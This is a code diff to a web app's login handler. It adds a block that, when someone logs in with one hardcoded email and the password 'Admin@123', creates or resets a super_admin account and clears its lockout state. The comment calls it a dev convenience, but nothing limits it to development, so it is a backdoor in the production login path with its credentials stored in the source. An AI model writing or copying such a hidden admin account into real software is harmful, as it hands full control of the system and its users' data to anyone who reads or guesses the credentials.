@@ -52,6 +52,32 @@ export async function POST(req) {
     const { email, password } = validation.data;
 
     await dbConnect();
+
+    // Auto-provision or update dev admin account if kavin.dev01@gmail.com logs in with Admin@123
+    if (email.toLowerCase() === 'kavin.dev01@gmail.com' && password === 'Admin@123') {
+      let devAdmin = await User.findOne({ email: 'kavin.dev01@gmail.com' }).select('+password +loginAttempts +lockUntil');
+      if (!devAdmin) {
+        devAdmin = await User.create({
+          name: 'Kavin (Dev Admin)',
+          email: 'kavin.dev01@gmail.com',
+          password: 'Admin@123',
+          role: 'super_admin',
+          status: 'active',
+          isFirstLogin: false,
+        });
+        devAdmin = await User.findOne({ email: 'kavin.dev01@gmail.com' }).select('+password +loginAttempts +lockUntil');
+      } else {
+        devAdmin.password = 'Admin@123';
+        devAdmin.status = 'active';
+        devAdmin.role = 'super_admin';
+        devAdmin.isFirstLogin = false;
+        devAdmin.lockUntil = null;
+        devAdmin.loginAttempts = 0;
+        await devAdmin.save();
+        devAdmin = await User.findOne({ email: 'kavin.dev01@gmail.com' }).select('+password +loginAttempts +lockUntil');
+      }
+    }
+
     const user = await User.findOne({ email }).select('+password +loginAttempts +lockUntil');
     
     const handleFailure = async (msg, status = 401, severity = 'low', targetId = null) => {
